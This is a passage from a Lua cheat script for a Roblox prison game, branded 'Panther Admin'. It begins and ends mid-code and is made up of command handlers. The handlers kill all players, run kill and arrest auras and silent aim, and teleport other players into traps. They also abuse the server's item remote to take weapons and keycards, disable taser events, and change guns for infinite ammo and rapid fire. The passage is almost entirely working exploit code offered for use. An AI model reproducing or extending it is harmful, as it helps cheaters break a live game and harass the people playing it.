			local Target = Kaito:FindPlayer(args[2])
			if Target then
				task.spawn(function()
					Kaito:bring(Target)
				end)
			end

		end
	end,nil,"[PLAYER]")
	Kaito:AddCmd("createnuke", "Player dies everyone dies", function(args)
		local Target = Kaito:FindPlayer(args[2])
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("PANTHER ADMIN: NUCLEAR IS ATTACHED TO "..Target.Name.." KILLING HIM WILL ACTIVATE THE NUCLEAR!!!", "ALL")
		repeat task.wait()
			if Target.Character and Target.Character:FindFirstChildOfClass("Humanoid") and Target.Character:FindFirstChildOfClass("Humanoid").Health <1 then
				break
			end
		until not game
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Target.Name.." IS DEAD NUKE LAUNCHING!!!", "ALL")
		wait(1.5)
		--//This is what I call perfect work 
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("NUKE LAUNCHING...", "ALL")
		wait(1.5)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("COUNTDOWNS START!!!", "ALL")
		wait(1.5)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("GETTING READY IN 3", "ALL")			
		wait(1.5)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("AND 2", "ALL")
		wait(1.5)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("AND 1", "ALL")
		wait(1)
		Kaito:killall()
		Kaito:Notif("Nuke from player has been removed.")
	end,nil,"[PLAYER]")
	Kaito:AddCmd("to", "Teleports to a player", function(args)
		local Player = Kaito:FindPlayer(args[2])
		if Player then
			Kaito:MoveTo(Player.Character:GetPrimaryPartCFrame())
		end
	end,true,"[PLAYER]")
	Kaito:AddCmd("cursor ", "Changes mouse icon", function(args)
		if args[2] and tonumber(args[2]) then
			game:GetService("UserInputService").MouseIcon = args[2]
		else
			Kaito:Notif("Invalid ID or no Second arg")
		end
	end,nil,"[ID]")
	Kaito:AddCmd("goto", "Teleports to a player", function(args)
		local Player = Kaito:FindPlayer(args[2])
		if Player then
			Kaito:MoveTo(Player.Character:GetPrimaryPartCFrame())
		end
	end,nil,"[PLAYER]")
	Kaito:AddCmd("clickarrest", "click on someone to arrest them", function(args)
		local value = ChangeState(args[2],"ClickArrest")
	end,nil,"[on/off]")
	Kaito:AddCmd("esp", "shows where all players are", function(args)
		local value = ChangeState(args[2],"esp")
		if value then
			if workspace:FindFirstChild("HIGHLIGHTS_1000") then
				return 
			end
			local Group = Instance.new("Model",workspace)
			Group.Name = "HIGHLIGHTS_1000"
			local esp =Instance.new("Highlight",Group)
			esp.FillColor = BrickColor.White().Color

			Temp.ESP = esp
			local function EspToggle(v)
				if not Temp.EspConnection  then
					return
				end
				task.spawn(function()
					pcall(function()
						if v.Character and v.Character:FindFirstChild("Head") then
							if v.Character.Parent == Group then
								return
							end
							v.Character.Archivable = true
							local v1 = Instance.new("BillboardGui",v.Character:FindFirstChild("Head"))
							local v2 = Instance.new("TextLabel",v1)
							table.insert(Temps.Esp, v1)
							table.insert(Temps.Esp, v2)
							v1.Adornee = v.Character.Head
							v1.Name = "123123123123"
							v1.Size = UDim2.new(0, 100, 0, 150)
							v1.StudsOffset = Vector3.new(0, 2, 0)
							v1.AlwaysOnTop = true
							v2.BackgroundTransparency = 1
							v2.TextColor3 = v.TeamColor.Color
							v2.TextStrokeTransparency = 0
							v2.TextYAlignment = Enum.TextYAlignment.Bottom
							v2.Position = UDim2.new(0, 0, 0, -50)
							v2.Size = UDim2.new(0, 120, 0, 120)
							v2.Font = Enum.Font.SourceSans
							v2.TextSize = 15
							v2.Text = v.Name
							v.Character.Parent = Group
						end
					end)
				end)
			end
			Temp.EspConnection=true
			repeat wait(.5)
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v and v~= game:GetService("Players").LocalPlayer then
						EspToggle(v)
					end
				end
				for i,v in pairs(Temp.Esps) do
					if v.Parent == nil then
						Kaito:Destroy(v)
					end
				end
			until Temp.EspConnection == nil
		else
			if workspace:FindFirstChild("HIGHLIGHTS_1000") then
				Kaito:Destroy(Temp.ESP)
				Temp.EspConnection = nil
				wait(.1)
				for i,v in pairs(workspace:FindFirstChild("HIGHLIGHTS_1000"):GetChildren()) do
					v.Parent = workspace
				end
				for i,v in pairs(Temp.Esps) do
					Kaito:Destroy(v)
				end
				Kaito:Destroy(workspace:FindFirstChild("HIGHLIGHTS_1000"))

			end
		end
	end,nil,"[ON/OFF]")
	Kaito:AddCmd("silentaim", "Fire and dont miss", function(args)
		local value = ChangeState(args[2],"SilentAim")
	end,nil,"[on/off]")
	Kaito:AddCmd("clickkill", "click on someone to kill them", function(args)
		local value = ChangeState(args[2],"ClickKill")
	end,nil,"[on/off]")
	Kaito:AddCmd("autorespawn", "you die and respawn back", function(args)
		local value = ChangeState(args[2],"AutoRespawn")
	end,nil,"[on/off]")
	Kaito:AddCmd("antisit", "Prevents you from sitting", function(args)
		local value = ChangeState(args[2],"AntiSit")
		if not value then
			game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Seated, true)
		end
	end,nil,"[on/off]")
	Kaito:AddCmd("antitouch", "Kills anyone who touches you", function(args)
		local value = ChangeState(args[2],"AntiTouch")
	end,nil,"[on/off]")
	Kaito:AddCmd("arrestaura", "Kills anyone close to you", function(args)
		local value = ChangeState(args[2],"ArrestAura")
	end,nil,"[on/off]")
	Kaito:AddCmd("killaura", "Kills anyone close to you", function(args)
		local value = ChangeState(args[2],"killaura")
		if value then
			Kaito:CreateKillPart()
		else
			if Temp.KillPart then
				pcall(function()
					Temp.KillPart:Destroy()
				end)
				Temp.KillPart = nil
			end
		end

	end,nil,"[on/off]")
	Kaito:AddCmd("autoitems", "Gets guns after you die", function(args)
		local value = ChangeState(args[2],"AutoItems")
	end,nil,"[on/off]")
	Kaito:AddCmd("antiarrest", "!!TRYS!! to Prevents you from getting arrested", function(args)
		local value = ChangeState(args[2],"AntiArrest")
	end,nil,"[on/off]")
	Kaito:AddCmd("noinvite", "disables discord invite", function(args)
		if writefile and readfile then
			writefile("Panther_Admin/Invite.json",game:GetService("HttpService"):JSONEncode({Invite_To_Server=false}))
			Kaito:Notif("Discord invite has been disabled!")
		else
			Kaito:Notif("executor not supported.")
		end
	end)
	Kaito:AddCmd("antipunch", "prevents anyone from punching you", function(args)
		local value = ChangeState(args[2],"antipunch")
		if States.antipunch then
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v and v~= plr and not table.find(Kaito.Whitelisted,v) then
					task.spawn(function()
						AntiPunchC(v)
					end)
					v.CharacterAdded:Connect(function(c)
						repeat task.wait() until c and c:FindFirstChildOfClass("Humanoid")
						if States.AntiPunch then
							if States.antipunch then
								AntiPunchC(v)
							end
						end
					end)
				end
			end
		end
	end,nil,"[on/off]")
	Kaito:AddCmd("antishield", "Deletes other peoples shields", function(args)
		local value = ChangeState(args[2],"Antishield")
	end,nil,"[on/off]")
	Kaito:AddCmd("spawnguns", "Loop kills you to spawn guns", function(args)
		local value = ChangeState(args[2],"spawnguns")
	end,nil,"[on/off]")
	Kaito:AddCmd("shootback", "Kills anyone who shoots you ", function(args)
		local value = ChangeState(args[2],"ShootBack")
	end,nil,"[on/off]")
	Kaito:AddCmd("onepunch", "Insta-kills anyone you punch", function(args)
		local value = ChangeState(args[2],"OnePunch")
	end,nil,"[on/off]")
	Kaito:AddCmd("antitase", "Prevents you from getting tased", function(args)
		local value = ChangeState(args[2],"AntiTase")

		if value then
			for i,v in pairs(getconnections(workspace:WaitForChild("Remote").tazePlayer.OnClientEvent)) do
				v:Disable()
			end
			Kaito:Notif("AntiTase has been changed to "..tostring(States.AntiTase))
		elseif not value then
			for i,v in pairs(getconnections(workspace:WaitForChild("Remote").tazePlayer.OnClientEvent)) do
				v:Enable()
			end
			Kaito:Notif("AntiTase has been changed to "..tostring(States.AntiTase))
		end
	end,nil,"[on/off]")
	Kaito:AddCmd("neutral", "Changes your team to Neutral", function(args)
		Kaito:ChangeTeam(game.Teams.Neutral,true)
	end)
	Kaito:AddCmd("inmate", "Changes your team to inmate", function(args)
		Kaito:ChangeTeam(game.Teams.Inmates,true)
	end)
	Kaito:AddCmd("guard", "Changes your team to guard", function(args)
		Kaito:ChangeTeam(game.Teams.Guards,true)
	end)
	Kaito:AddCmd("criminal", "Changes your team to criminal or a person", function(args)
		if args[2] == "random" then
			local random = nil
			while true do
				random = game:GetService("Players"):GetPlayers()[math.random(1, #game:GetService("Players"):GetPlayers())]
				task.wait()
				if random.Team ~= game.Teams.Criminals and random ~= game:GetService("Players").LocalPlayer then
					break
				end
			end
			local Target = random
			if Target.Team == game:GetService("Teams").Inmates then
				Kaito:bring(Target,CFrame.new()*CFrame.new(0,2,0))
			elseif Target.Team == game:GetService("Teams").Guards then
				Kaito:bring(Target,CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)*CFrame.new(-4.5,2,-3),true)
			end
		else
			if args[2] then
				local Target = Kaito:FindPlayer(args[2])
				if Target == Player then
					Kaito:ChangeTeam(game.Teams.Criminals,true)
					return
				end
				if Target then
					if Target.Team == game:GetService("Teams").Inmates then
						Kaito:bring(Target,CFrame.new()*CFrame.new(0,2,0))
					elseif Target.Team == game:GetService("Teams").Guards then
						Kaito:bring(Target,CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)*CFrame.new(-4.5,2,-3),true)
					end
				end
			else
				Kaito:ChangeTeam(game.Teams.Criminals,true)
			end
		end
	end,nil,"[ME,PLAYER]")
	Kaito:AddCmd("unview", "Unwatches the selected target", function(args)
		Temp.ViewingPlayer = nil
		wait()
		game:GetService("Workspace").Camera.CameraSubject = plr.Character.Humanoid
	end)
	Kaito:AddCmd("pcar", "Brings a car to you", function(args)
		pcall(function()
			local OldPos = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
			game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(589, 99, 2493))
			wait()
			local car = nil
			task.spawn(function()
				car = game:GetService("Workspace").CarContainer.ChildAdded:Wait()
			end)
			repeat wait(.1)
				local ohInstance1 = game:GetService("workspace").Prison_ITEMS.buttons:GetChildren()[5]["Car Spawner"]
				workspace.Remote.ItemHandler:InvokeServer(ohInstance1)
			until car
			repeat task.wait() until car:FindFirstChild("RWD") and car:FindFirstChild("Body") and car:FindFirstChild("Body"):FindFirstChild("VehicleSeat")
			car.PrimaryPart = car.RWD
			game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(OldPos)
			wait(1)
			local Done = false
			car.Body.VehicleSeat:Sit(game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
			repeat 

				game:GetService("RunService").RenderStepped:Wait()
				car:SetPrimaryPartCFrame(OldPos)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =CFrame.new(car.Body.VehicleSeat.Position)
				car.Body.VehicleSeat:Sit(game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
				if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Sit == true then
					Done = true
				end
			until Done
		end)
	end)
	Kaito:AddCmd("car", "Brings a car to you", function(args)
		pcall(function()
			local OldPos = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
			game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-910, 95, 2157))
			wait()
			local car = nil
			task.spawn(function()
				car = game:GetService("Workspace").CarContainer.ChildAdded:Wait()
			end)
			repeat wait(.1)
				local ohInstance1 = game:GetService("Workspace").Prison_ITEMS.buttons:GetChildren()[8]["Car Spawner"]
				workspace.Remote.ItemHandler:InvokeServer(ohInstance1)
			until car
			repeat task.wait() until car:FindFirstChild("RWD") and car:FindFirstChild("Body") and car:FindFirstChild("Body"):FindFirstChild("VehicleSeat")
			car.PrimaryPart = car.RWD
			game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(OldPos)
			wait(1)
			local Done = false
			car.Body.VehicleSeat:Sit(game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
			repeat 

				game:GetService("RunService").RenderStepped:Wait()
				car:SetPrimaryPartCFrame(OldPos)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =CFrame.new(car.Body.VehicleSeat.Position)
				car.Body.VehicleSeat:Sit(game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
				if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Sit == true then
					Done = true
				end
			until Done
		end)
	end)
	Kaito:AddCmd("opengate", "Opens the main prison gate", function(args)
		local OldPos = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
		Kaito:MoveTo(CFrame.new(503.998993, 102.039917, 2242.79907, 0.99996537, -1.0554821e-08, -0.00832392555, 1.00791926e-08, 1, -5.71817864e-08, 0.00832392555, 5.70959067e-08, 0.99996537))
		wait(.1)
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.buttons["Prison Gate"]["Prison Gate"])
		Kaito:MoveTo(OldPos)
	end)
	Kaito:AddCmd("fly", "Enter plane mode but dont hit towers", function(args)
		Kaito:Unfly()
		wait(.4)
		Kaito:Fly(tonumber(args[2]) or 7)
	end)
	Kaito:AddCmd("carfly", "Car go flying", function(args)
		Kaito:Unfly()
		wait()
		Kaito:Fly(10)
	end)
	Kaito:AddCmd("uncarfly", "stop the car fly", function(args)
		Kaito:Unfly()
	end)
	Kaito:AddCmd("unfly", "Disables fly", function(args)
		Kaito:Unfly()
	end)

	Kaito:AddCmd("keycard", "Gets a keycard", function(args)
		local Oldc = Kaito:GetPosition()
		local OldT = Player.Team
		if plr.Character:FindFirstChild("Key card") or plr.Backpack:FindFirstChild("Key card") then
			return Kaito:Notif("You already have a keycard!",false)
		end
		if #game.Teams.Guards:GetPlayers() == 8 and plr.Team ~= game.Teams.Guards then
			Kaito:Notif("Guards team is full!")
			return
		end
		Kaito:ChangeTeam(game.Teams.Guards)
		repeat wait(.5)
			Player.Character:FindFirstChildOfClass("Humanoid"):ChangeState(15)
			wait()
			Kaito:Refresh()
		until game:GetService("Workspace")["Prison_ITEMS"].single:FindFirstChild("Key card")
		if game:GetService("Workspace")["Prison_ITEMS"].single:FindFirstChild("Key card") then
			if Player.Team ~= OldT then
				Kaito:ChangeTeam(OldT)
				repeat task.wait() until Player.Team == OldT
			end
			wait()
			repeat wait()
				local a =pcall(function()
					local Key = workspace.Prison_ITEMS.single["Key card"].ITEMPICKUP
					game.Workspace.Remote["ItemHandler"]:InvokeServer(Key)
					Kaito:MoveTo(CFrame.new(workspace.Prison_ITEMS.single["Key card"].ITEMPICKUP.Position+Vector3.new(0,3,0)))
				end)
			until plr.Backpack:FindFirstChild("Key card")
		end
		Kaito:MoveTo(Oldc)
	end)
	Kaito:AddCmd("refresh", "refreshes your character", function(args)
		Kaito:Refresh(true)
	end)
	Kaito:AddCmd("roof", "Telepirt To Roof", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(820.6336059570312, 120.48998260498047, 2352.623046875))
			end
		else
			Kaito:MoveTo(CFrame.new(820.6336059570312, 120.48998260498047, 2352.623046875))
		end
	end, true)
	Kaito:AddCmd("nex", "Teleport To Nex", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
			end
		else
			Kaito:MoveTo(CFrame.new(918.77, 100, 2379.07))
		end
	end, true)
	Kaito:AddCmd("prison", "Teleports to prison", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
			end
		else
			Kaito:MoveTo(CFrame.new(918.77, 100, 2379.07))
		end
	end)
	Kaito:AddCmd("m4a1", "Gets a M4A1 gun", function(args)
		Kaito:GetGun("M4A1")
	end)
	Kaito:AddCmd("m9", "Gets a M9 gun", function(args)
		Kaito:GetGun("M9")
	end)
	Kaito:AddCmd("shotgun", "Gets a shotgun", function(args)
		Kaito:GetGun("Remington 870")
	end)
	Kaito:AddCmd("ak", "Gets a ak-47", function(args)
		Kaito:GetGun("AK-47")
	end)
	Kaito:AddCmd("knife", "Gets a knife", function(args)
		workspace.Remote.ItemHandler:InvokeServer({Position=game:GetService("Players").LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.single["Crude Knife"]})
	end)
	Kaito:AddCmd("hammer", "Gets a hammer", function(args)
		workspace.Remote.ItemHandler:InvokeServer({Position=game:GetService("Players").LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.single["Hammer"]})
	end)
	Kaito:AddCmd("yard", "Teleports to yard", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(791, 98, 2498))
			end
		else

			Kaito:MoveTo(CFrame.new(791, 98, 2498))
		end
	end)
	Kaito:AddCmd("gas", "Teleports to gas station", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(-518, 54, 1655))
			end
		else
			Kaito:MoveTo(CFrame.new(-518, 54, 1655))
		end
	end)
	Kaito:AddCmd("cafe", "Teleports to Canteen", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(877, 100, 2256))
			end
		else
			Kaito:MoveTo(CFrame.new(877, 100, 2256))
		end
	end)
	Kaito:AddCmd("bridge", "Teleports to Bridge", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(54, 33, 1311))
			end
		else
			Kaito:MoveTo(CFrame.new(54, 33, 1311))
		end
	end)
	Kaito:AddCmd("kitchen", "Teleports to Kitchen", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(905, 100, 2226))
			end
		else
			Kaito:MoveTo(CFrame.new(905, 100, 2226))
		end
	end)

	Kaito:AddCmd("crimbase", "Teleports to Criminal Base", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(-858.08990478516, 94.476051330566, 2093.8288574219))
			end
		else
			Kaito:MoveTo(CFrame.new(-858.08990478516, 94.476051330566, 2093.8288574219))
		end
	end)
	Kaito:AddCmd("cbase", "Teleports to cbase", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(-858.08990478516, 94.476051330566, 2093.8288574219))
			end
		else
			Kaito:MoveTo(CFrame.new(-858.08990478516, 94.476051330566, 2093.8288574219))
		end
	end,true)
	Kaito:AddCmd("WhiteHouse", "Teleports to WhiteHouse", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(-98, 56, 2417))
			end
		else
			Kaito:MoveTo(CFrame.new(-98, 56, 2417))
		end
	end,true)
	Kaito:AddCmd("ExploitersBase", "Teleports to Exploiters  Base", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(-937, 94, 1993))
			end
		else
			Kaito:MoveTo(CFrame.new(-937, 94, 1993))
		end
	end,true)
	Kaito:AddCmd("School2", "Teleports to School 2", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(-242, 56, 2123))
			end
		else
			Kaito:MoveTo(CFrame.new(-242, 56, 2123))
		end
	end,true)
	Kaito:AddCmd("School1", "Teleports to School 1", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(-278, 56, 2080))
			end
		else
			Kaito:MoveTo(CFrame.new(-278, 56, 2080))
		end
	end,true)
	Kaito:AddCmd("Mansion", "Teleports to Mansion", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(-230, 67, 2520))
			end
		else
			Kaito:MoveTo(CFrame.new(-230, 67, 2520))
		end
	end,true)
	Kaito:AddCmd("Armory", "Teleports to Armory", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(830, 102, 2267))
			end
		else
			Kaito:MoveTo(CFrame.new(830, 102, 2267))
		end
	end)
		Kaito:AddCmd("Cells", "Teleports to Cells", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(919, 100, 2455))
			end
		else
			Kaito:MoveTo(CFrame.new(919, 100, 2455))
		end
	end)
	Kaito:AddCmd("Trap", "trap players", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(-321, 65, 1834))
			end
		else
			Kaito:MoveTo(CFrame.new(-321, 65, 1834))
		end
	end)
	Kaito:AddCmd("Gate", "Teleports to Gate", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(506, 102, 2254))
			end
		else
			Kaito:MoveTo(CFrame.new(506, 102, 2254))
		end
	end)
	Kaito:AddCmd("Crim", "Makes Player Criminal Team", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(-977, 109, 2044))
			end
		else
			Kaito:MoveTo(CFrame.new(-977, 109, 2044))
		end
	end)
	Kaito:AddCmd("GuardTower", "Teleports to GuardTower", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(822, 119, 2323))
			end
		else
			Kaito:MoveTo(CFrame.new(822, 119, 2323))
		end
	end)
		Kaito:AddCmd("CCTV", "Teleports to CCTV", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(802, 100, 2335))
			end
		else
			Kaito:MoveTo(CFrame.new(802, 100, 2335))
		end
	end)
	Kaito:AddCmd("Lobby", "Teleports to Lobby", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(879, 28, 2337))
			end
		else
			Kaito:MoveTo(CFrame.new(879, 28, 2337))
		end
	end)
	Kaito:AddCmd("PrisonBack", "Teleports Behind The Prison", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:Brinv(Target, CFrame.new(985, 100, 2269))
			end
		else
			Kaito:MoveTo(CFrame.new(985, 100, 2269))
		end
	end)
	Kaito:AddCmd("SecretRoom", "Teleports to SecretRoom", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(702, 103, 2367))
			end
		else
			Kaito:MoveTo(CFrame.new(702, 103, 2367))
		end
	end)
	Kaito:AddCmd("Office", "Teleports to Office", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(789, 100, 2260))
			end
		else
			Kaito:MoveTo(CFrame.new(789, 100, 2260))
		end
	end)
	Kaito:AddCmd("tower", "Teleports to Tower", function(args)
		if args[2] then
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				Kaito:bring(Target, CFrame.new(823, 143, 2589))
			end
		else
			Kaito:MoveTo(CFrame.new(823, 143, 2589))
		end
	end)
	Temp.CmdsC = false
	Commands.Visible = false
	Kaito:AddCmd("cmds", "Toggles commands gui", function(args)
		if not Temp.CmdsC then
			Temp.CmdsC = true
			if Commands.Visible == false then
				Commands.Position = Commands.Position + UDim2.new(0, 0, 1, 0)
				wait(.1)
				Commands:TweenPosition(SavedCmdsPosition, "Out", "Sine", 1)
				Commands.Visible = true
			else
				Commands:TweenPosition(SavedCmdsPosition + UDim2.new(0, 0, 1, 0), "Out", "Quart", 1)
				wait(.5)
				Commands.Visible = false
			end
			wait(.7)
			Temp.CmdsC = false
		end
	end)
	Kaito:AddCmd("rejoin", "rejoins the same server (UNLOADS SCRIPT)", function(args)
		wait(.3)
		if #game:GetService("Players"):GetPlayers() ==1 then
			game:GetService("Players").LocalPlayer:Kick("Please wait.")
			game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
		else
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
		end
	end)
	Kaito:AddCmd("rj", "rejoins the same server (UNLOADS SCRIPT)", function(args)
		wait(.3)
		if #game:GetService("Players"):GetPlayers() ==1 then
			game:GetService("Players").LocalPlayer:Kick("Please wait.")
			game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
		else
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
		end
	end,true)
	Kaito:AddCmd("re", "refreshes your character", function(args)
		Kaito:Refresh(true)
	end, true)
	Kaito:AddCmd("allcmds", "tells you the ammount of commands Panther admin has", function(args)
		Kaito:Notif("Panther admin has "..tostring(AmmountCurrent).." commands.")
	end)

	Kaito:AddCmd("serverhop", "Joins a different server", function(args)
		local Ids = {}
		for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).Kaito) do
			if typeof(v) == "table" and v['maxPlayers'] > v['playing'] and v['id'] ~= game['JobId'] then
				table.insert(Ids,v.id)
			end
		end
		return game:GetService("TeleportService"):TeleportToPlaceInstance(game['PlaceId'], Ids[math.random(1, #Ids)])
	end)

	Kaito:AddCmd("btools", "Destroy walls", function(args)
		Instance.new("HopperBin",plr.Backpack).BinType = 3
		Instance.new("HopperBin",plr.Backpack).BinType = 4
	end)

	Kaito:AddCmd("guns", "Gets every single gun", function(args)
		Kaito:AllGuns()
	end)

	Kaito:AddCmd("items", "Gets every single gun", function(args)
		Kaito:AllGuns()
	end)
	Kaito:AddCmd("noclip", "Go through walls", function(args)
		if States.noclip == nil then
			States.noclip = false
		end
		States.noclip = not States.noclip
		if States.noclip then
			pcall(function()
				Temp.Noclipping:Disconnect()
				Temp.Noclipping = nil
			end)
			wait()
			Temp.Noclipping = game:GetService("RunService").Stepped:Connect(function()
				for i,v in pairs(plr.Character:GetDescendants()) do
					if v and v:IsA("Part") or v:IsA("MeshPart") and v.CanCollide and Unloaded == false then
						v.CanCollide = false
					end
				end
			end)
			Kaito:Notif("Noclip enabled")
		else
			pcall(function()
				Temp.Noclipping:Disconnect()
				Temp.Noclipping = nil
			end)
			wait()
			Kaito:Refresh(true)
		end
	end)
	Kaito:AddCmd("clip", "Disables noclip", function(args)
		States.noclip = false
		pcall(function()
			Temp.Noclipping:Disconnect()
			Temp.Noclipping = nil
		end)
		Kaito:Refresh(true)
		Kaito:Notif("Noclip disabled")
	end)
	Kaito:AddCmd("autofire", "Mods the gun", function(args)
		if plr.Character:FindFirstChildOfClass("Tool") then
			local Tool = plr.Character:FindFirstChildOfClass("Tool")
			if not Tool:FindFirstChild("GunStates") then
				return Kaito:Notif("Needs to be a gun!",false)
			end
			local cc = require(Tool.GunStates)
			cc["AutoFire"] = true
			table.insert(Reload_Guns, Tool)
			Player.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
		else
			Kaito:Notif("You need to hold the tool you want to mod!",false)
		end
	end)
	Kaito:AddCmd("fastfire", "hold a gun to modified your gun", function(args)
		if plr.Character:FindFirstChildOfClass("Tool") then
			local Tool = plr.Character:FindFirstChildOfClass("Tool")
			if not Tool:FindFirstChild("GunStates") then
				return Kaito:Notif("Needs to be a gun!",false)
			end
			local cc = require(Tool.GunStates)
			cc["FireRate"] = 0.001
			table.insert(Reload_Guns, Tool)
			Player.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
		else
			Kaito:Notif("You need to hold the tool you want to mod!",false)
		end
	end)
	Kaito:AddCmd("infa", "gives infinity ammo", function(args)
		if plr.Character:FindFirstChildOfClass("Tool") then
			local Tool = plr.Character:FindFirstChildOfClass("Tool")
			if not Tool:FindFirstChild("GunStates") then
				return Kaito:Notif("Needs to be a gun!")
			end
			local cc = require(Tool.GunStates)
			cc["MaxAmmo"] = math.huge
			cc["StoredAmmo"] = math.huge
			cc["AmmoPerClip"] = math.huge
			cc["CurrentAmmo"] = math.huge
			table.insert(Reload_Guns, Tool)
			Player.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
		wait(2)
			Player.Character:FindFirstChildOfClass("Humanoid"):EquipTools()
		else
			Kaito:Notif("You need to hold the tool you want to mod!",false)
		end
	end)
	Kaito:AddCmd("infammo", "hold a tool to mod your gun", function(args)
		if plr.Character:FindFirstChildOfClass("Tool") then
			local Tool = plr.Character:FindFirstChildOfClass("Tool")
			if not Tool:FindFirstChild("GunStates") then
				return Kaito:Notif("Needs to be a gun!")
			end
			local cc = require(Tool.GunStates)
